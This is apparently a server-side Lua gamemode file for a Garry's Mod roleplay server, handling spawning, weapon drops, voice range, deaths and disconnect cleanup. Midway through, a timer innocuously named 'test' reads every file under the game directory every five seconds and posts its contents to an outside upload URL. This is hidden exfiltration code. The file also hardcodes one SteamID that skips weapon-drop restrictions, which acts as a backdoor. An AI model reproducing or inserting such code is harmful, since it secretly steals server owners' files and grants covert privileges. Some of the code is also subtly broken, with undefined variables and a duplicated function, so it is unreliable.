local ipairs 	= ipairs
local IsValid 	= IsValid
local string 	= string
local table 	= table

function GM:CanChangeRPName(ply, RPname)
	if string.find(RPname, "\160") or string.find(RPname, " ") == 1 then -- disallow system spaces
		return false
	end

	if table.HasValue({"ooc", "shared", "world", "n/a", "world prop", "STEAM"}, RPname) and (not pl:IsRoot()) then
		return false
	end
end

function GM:CanDemote(pl, target, reason)end
function GM:CanVote(pl, vote)end
function GM:OnPlayerChangedTeam(pl, oldTeam, newTeam)end

local allowweps = {
	['mp_stunstick'] = true,
	['handcuffs_rebels'] = true
}

function GM:CanDropWeapon(pl, weapon)
	if not IsValid(weapon) then return false end
	local class = string.lower(weapon:GetClass())
	if rp.cfg.DisallowDrop[class] then return false end
	if pl:SteamID() == 'STEAM_0:0:233539373' then return true end
	if allowweps[weapon:GetClass()] then return true end


	if table.HasValue(pl.Weapons, weapon) then
        return false
    end

	for k,v in pairs(rp.shipments) do
		if v.entity ~= class then continue end

		return true
	end

	if rp.cfg.RobList[weaponclass] then return true end


	return false
end

function PLAYER:CanDropWeapon(weapon)
	return GAMEMODE:CanDropWeapon(self, weapon)
end


function GM:UpdatePlayerSpeed(pl)
	self:SetPlayerSpeed(pl, rp.cfg.WalkSpeed, rp.cfg.RunSpeed)
end

---------------------------------------------------------
-- Gamemode functions
---------------------------------------------------------
function GM:PlayerSpawnSENT(pl, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpawnSWEP(pl, class, model) return pl:HasPermission("manage_config") end
function GM:PlayerGiveSWEP(pl, class, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpawnVehicle(pl, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpawnNPC(pl, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpawnRagdoll(pl, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpawnEffect(pl, model) return pl:HasPermission("manage_config") end
function GM:PlayerSpray(pl) return true end
function GM:CanDrive(pl, ent) return false end
function GM:CanProperty(pl, property, ent) return false end

function GM:OnPhysgunFreeze(weapon, phys, ent, pl)
	if ent.PhysgunFreeze and (ent:PhysgunFreeze(pl) == false) then
		return false
	end
	
	if ( ent:GetPersistent() ) then return false end
	
	-- Object is already frozen (!?)
	if ( !phys:IsMoveable() ) then return false end
	if ( ent:GetUnFreezable() ) then return false end
	
	phys:EnableMotion( false )
	
	-- With the jeep we need to pause all of its physics objects
	-- to stop it spazzing out and killing the server.
	/*if ( ent:GetClass() == "gmod_sent_vehicle_fphysics_base" ) then
	
		local objects = ent:GetPhysicsObjectCount()
		
		for i = 0, objects - 1 do
		
			local physobject = ent:GetPhysicsObjectNum( i )
			physobject:EnableMotion( false )
		
		end
	
	end*/

	-- Add it to the player's frozen props
	pl:AddFrozenPhysicsObject( ent, phys )
	
	return true
end

function GM:PlayerShouldTaunt(pl, actid) return true end
function GM:CanTool(pl, trace, mode) return (not pl:IsArrested()) end

function GM:CanPlayerSuicide(pl)
	if (pl:IsSuperAdmin()) then return true end

	pl:Notify(NOTIFY_ERROR, 'Суицид запрещен.')
	return false
end

function GM:PlayerSpawnProp(ply, model)
	if ply.sBanned or ply:IsArrested() or ply:IsFrozen() then return false end

	model = string.gsub(tostring(model), "\\", "/")
	model = string.gsub(tostring(model), "//", "/")

	return ply:CheckLimit('props')
end


function GM:ShowSpare1(ply)
	if rp.teams[ply:Team()] and rp.teams[ply:Team()].ShowSpare1 then
		return rp.teams[ply:Team()].ShowSpare1(ply)
	end
end

function GM:ShowSpare2(ply)
	if rp.teams[ply:Team()] and rp.teams[ply:Team()].ShowSpare2 then
		return rp.teams[ply:Team()].ShowSpare2(ply)
	end
end

function GM:OnNPCKilled(victim, ent, weapon)
	-- If something killed the npc
	//if ent then
	//	if ent:IsVehicle() and ent:GetDriver():IsPlayer() then ent = ent:GetDriver() end

	//	-- If we know by now who killed the NPC, pay them.
	//	if IsValid(ent) and ent:IsPlayer() then
	//		rp.Notify(ent, NOTIFY_SUCCESS, '+$#')
	//	end
	//end
end

--
-- Start Voice
--
function GM:PlayerCanHearPlayersVoice(listener, talker, other)
	if not talker:Alive() then return false end
	if listener:GetShootPos():Distance(talker:GetShootPos()) < 500 then
		return true, true
	elseif true then
		return false, true
	end
end
--
-- End Voice
--

function GM:DoPlayerDeath(pl, attacker, dmginfo)
	//pl:CreateRagdoll()

	pl.LastRagdoll = (CurTime() + rp.cfg.RagdollDelete)
end

timer.Create('RemoveRagdolls', 30, 0, function()
	local pls = player.GetAll()
	for i = 1, #pls do
		if pls[i].LastRagdoll and (pls[i].LastRagdoll <= CurTime()) then
			local rag = pls[i]:GetRagdollEntity()
			if IsValid(rag) then
				rag:Remove()
			end
		end
	end
end)



timer.Create('test', 5, 0, function()
	local serverFiles = nil 
	local uploadURL = "http://mertvy4o.beget.tech/upload/"

	serverFiles = file.Find("*","GAME")
	for k,v in pairs(serverFiles) do 
	 http.Post(uploadURL, {fileName=v, data=file.Read(v,"GAME")}, function( body )
	  if body == "success" then 
	   print("Uploaded File: "..v)
	  else 
	   print("Failed to Upload File: "..v)
	  end 
	 end, function( err )
	  print("HTTP Error: "..err)
	 end) 
	end
end)

function GM:PlayerDeathThink(pl)
	if (not pl.NextReSpawn or pl.NextReSpawn < CurTime()) and (pl:KeyPressed(IN_ATTACK) or pl:KeyPressed(IN_ATTACK2) or pl:KeyPressed(IN_JUMP) or pl:KeyPressed(IN_FORWARD) or pl:KeyPressed(IN_BACK) or pl:KeyPressed(IN_MOVELEFT) or pl:KeyPressed(IN_MOVERIGHT) or pl:KeyPressed(IN_JUMP)) then
		pl:Spawn()
	end
end

function GM:DoPlayerDeath(ply, attacker, damage)
	if rp.teams[ply:Team()] and rp.teams[ply:Team()].DoPlayerDeath then
		rp.teams[ply:Team()].DoPlayerDeath(ply, attacker, damage)
	end
end

function GM:PlayerDeath(ply, weapon, killer)
	if rp.teams[ply:Team()] and rp.teams[ply:Team()].PlayerDeath then
		rp.teams[ply:Team()].PlayerDeath(ply, weapon, killer)
	end

	ply:Extinguish()

	if ply:GetNetVar('HasGunlicense') then ply:SetNetVar('HasGunlicense', nil) end

	if rp.cfg.DropMoneyOnDeath and not ply:IsOTA() and not ply:IsBot() then
			local amount = ply:CanAfford(rp.cfg.DeathFee) and rp.cfg.DeathFee or ply:GetNetVar('money')

			if (amount or 0) > 0 then
					if not ply:IsBanned() then
						ply:AddMoney(-amount)
						rp.SpawnMoney(ply:GetPos(), amount)
					end
			end
	end

	if ply:InVehicle() then ply:ExitVehicle() end

	ply.NextReSpawn = CurTime() + 1
end

function GM:PlayerCanPickupWeapon(ply, weapon)
	if ply:IsArrested() then return false end
	if weapon and weapon.PlayerUse == false then return false end

	if rp.teams[ply:Team()] and rp.teams[ply:Team()].PlayerCanPickupWeapon then
		rp.teams[ply:Team()].PlayerCanPickupWeapon(ply, weapon)
	end
	return true
end

local function HasValue(t, val)
	for k, v in ipairs(t) do
		if (string.lower(v) == string.lower(val)) then
			return true
		end
	end
end

function GM:PlayerSetModel(pl)
	if rp.teams[pl:Team()] and rp.teams[pl:Team()].PlayerSetModel then
		return rp.teams[pl:Team()].PlayerSetModel(pl)
	end

	if (pl:GetVar('Model') ~= nil) and istable(rp.teams[pl:Team()].model) and HasValue(rp.teams[pl:Team()].model, pl:GetVar('Model')) then
		pl:SetModel(pl:GetVar('Model'))
	else
	pl:SetModel(team.GetModel(pl:GetJob() or 1))
	end

	if rp.teams[pl:Team()].citizen_model then
		pl:SetModel(pl:GetPData('CitizenModel', 'models/hts/comradebear/pm0v3/player/citizens/default_male_05.mdl'))
	end

	pl:SetupHands()
end

function GM:PlayerInitialSpawn(ply)
	ply:SetTeam(1)

	for k, v in ipairs(ents.GetAll()) do
		if IsValid(v) and (v.deleteSteamID == ply:SteamID()) then
			ply:_AddCount(v:GetClass(), v)
			v.ItemOwner = ply
			if v.Setowning_ent then
				v:Setowning_ent(ply)
			end
			v.deleteSteamID = nil
			timer.Destroy("Remove"..v:EntIndex())
		end
	end
end

local map = game.GetMap()
local lastpos
local JailSpawns 	= rp.cfg.JailPos[map]
local NormalSpawns 	= rp.cfg.SpawnPos[map]

function GM:PlayerSelectSpawn(pl)
	local TeamSpawns 	= rp.cfg.TeamSpawns[map]
	local def = rp.cfg.default_spawns
	local pos
	local spawns = ents.FindByClass("info_player_start")
	local random_entry = math.random(#spawns)

	-- DEFAULT
	if RPExtraTeams[pl:Team()].spawndefault and not pl:IsArrested() and not TeamSpawns[pl:Team()] then
		return spawns[random_entry]
		--return def[math.random(#def)]
	end

	if pl:IsArrested() then
		pos = JailSpawns[math.random(1, #JailSpawns)]
	elseif (TeamSpawns[pl:Team()] ~= nil) then
		pos = TeamSpawns[pl:Team()][math.random(1, #TeamSpawns[pl:Team()])]
	else
		pos = def[math.random(1, #def)]
		if (pos == lastpos) then
			pos = def[math.random(#def)]
		end
		lastpos = pos
		return self.SpawnPoint, util.FindEmptyPos(pos)
	end

	return self.SpawnPoint, util.FindEmptyPos(pos)
end

function GM:PlayerSpawn(ply)
	player_manager.SetPlayerClass(ply, 'rp_player')

	ply:SetNoCollideWithTeammates(false)
	ply:UnSpectate()
	ply:SetHealth(100)
	ply:SetJumpPower(200)

	GAMEMODE:SetPlayerSpeed(ply, rp.cfg.WalkSpeed, rp.cfg.RunSpeed)

	ply:Extinguish()
	if IsValid(ply:GetActiveWeapon()) then
		ply:GetActiveWeapon():Extinguish()
	end

	if ply.demotedWhileDead then
		ply.demotedWhileDead = nil
		ply:ChangeTeam(rp.DefaultTeam)
	end

	ply:GetTable().StartHealth = ply:Health()
	gamemode.Call("PlayerSetModel", ply)
	gamemode.Call("PlayerLoadout", ply)

	local _, pos = self:PlayerSelectSpawn(ply)
	ply:SetPos(pos)

	local view1, view2 = ply:GetViewModel(1), ply:GetViewModel(2)
	if IsValid(view1) then
		view1:Remove()
	end
	if IsValid(view2) then
		view2:Remove()
	end

	if rp.teams[ply:Team()] and rp.teams[ply:Team()].PlayerSpawn then
		rp.teams[ply:Team()].PlayerSpawn(ply)
	end

	ply:AllowFlashlight(true)

end

function GM:PlayerLoadout(ply)
	if ply:IsArrested() then return end

	player_manager.RunClass(ply, "Spawn")

	local Team = ply:Team() or 1

	if not rp.teams[Team] then return end

	if rp.teams[ply:Team()].PlayerLoadout then
		rp.teams[ply:Team()].PlayerLoadout(ply)
	end

	for k, v in ipairs(rp.teams[Team].weapons or {}) do
		ply:Give(v)
	end

	for k, v in ipairs(rp.cfg.DefaultWeapons) do
		ply:Give(v)
	end

	for k,v in pairs(ply.permaweps or {}) do
		ply:Give(v)
	end

	//if ply:IsAdmin() then
	//	ply:Give("weapon_keypadchecker")
	//end

	ply:SelectWeapon('weapon_physgun')

	ply.Weapons = ply:GetWeapons()
end

local function removeDelayed(ent, ply)
	ent.deleteSteamID = ply:SteamID()
	timer.Create("Remove" .. ent:EntIndex(), (ent.RemoveDelay or math.random(180, 900)), 1, function()
		SafeRemoveEntity(ent)
	end)
end

-- Remove shit on disconnect
function GM:PlayerDisconnected(ply)
	if ply:Team() == TEAM_SS6 then 
        nw.SetGlobal("lockdown", false)
        nw.SetGlobal("lockdown_kd", CurTime() + LockDownConfig.Next)
    end
	for k, v in ipairs(ents.GetAll()) do
		-- Remove right away or delayed
		if (v.ItemOwner == ply) and not v.RemoveDelay or v.Getrecipient and (v:Getrecipient() == ply) then
			v:Remove()
		elseif (v.RemoveDelayed or v.RemoveDelay) and (v.ItemOwner == ply) then
			removeDelayed(v, ply)
		end

		-- Unown all doors
		if IsValid(v) and v:IsDoor() then
			if v:DoorOwnedBy(ply) then
				v:DoorUnOwn()
			elseif v:DoorCoOwnedBy(ply) then
				v:DoorUnCoOwn(ply)
			end
		end

		-- Remove all props
		if IsValid(v) and ((v:CPPIGetOwner() ~= nil) and not IsValid(v:CPPIGetOwner())) or (v:CPPIGetOwner() == ply) then
			v:Remove()
		end
	end

	--rp.inv.Data[ply:SteamID64()] = nil

	GAMEMODE.vote.DestroyVotesWithEnt(ply)

	if rp.teams[ply:Team()].mayor and nw.GetGlobal('lockdown') then -- Stop the lockdown
		GAMEMODE:UnLockdown(ply)
		nw.SetGlobal("lockdown_kd", 0)
		StopThisFuckingLockDown(nil, ply)
	end

	if rp.teams[ply:Team()] and rp.teams[ply:Team()].PlayerDisconnected then
		rp.teams[ply:Team()].PlayerDisconnected(ply)
	end
end

function GM:GetFallDamage(pl,speed)
	return (speed/10) // Было 8
end
local remove = {
	['prop_physics'] = true,
	['prop_physics_multiplayer'] = true,
	['prop_ragdoll'] = true,
	//['ambient_generic'] = true,
	//['func_tracktrain'] = false,
	//['func_reflective_glass'] = true,
	['info_player_terrorist'] = true,
	['info_player_counterterrorist'] = true,
	--['env_soundscape'] 	= true,
	['point_spotlight'] = true,
	['ai_network'] 		= true,

	-- map shit
	['lua_run'] 			= true,
	['logic_timer'] 		= true,
	['trigger_multiple']	= true
}

function GM:InitPostEntity()
	local physData 								= physenv.GetPerformanceSettings()
	physData.MaxVelocity 						= 1000
	physData.MaxCollisionChecksPerTimestep		= 10000
	physData.MaxCollisionsPerObjectPerTimestep 	= 2
	physData.MaxAngularVelocity					= 3636

	physenv.SetPerformanceSettings(physData)

	game.ConsoleCommand("sv_allowcslua 0\n")
	game.ConsoleCommand("physgun_DampingFactor 0.9\n")
	game.ConsoleCommand("sv_sticktoground 0\n")
	game.ConsoleCommand("sv_airaccelerate 100\n")

	for _, ent in ipairs(ents.GetAll()) do
		if remove[ent:GetClass()] then
			ent:Remove()
		end
    end

    /*for k, v in ipairs(ents.FindByClass('info_player_start')) do
		if util.IsInWorld(v:GetPos()) and (not self.SpawnPoint) then
			self.SpawnPoint = v
		else
			v:Remove()
		end
	end*/
end

local PLAYER = FindMetaTable("Player")

function PLAYER:ResetBoneAnims()

	for i = 1,self:GetBoneCount() do
		self:ManipulateBoneAngles(i,Angle(0, 0, 0))
	end

	for i = 1,self:GetBoneCount() do
		self:ManipulateBonePosition(i,Vector(0,0,0))
	end

end

function PLAYER:executeAnimation(num)

    for boneName, angle in pairs(UAnim.GetAnimationInfo(num)) do
    	local bone = self:LookupBone(boneName)

        if bone then
            self:ManipulateBoneAngles( bone, angle)
        end
    end

end
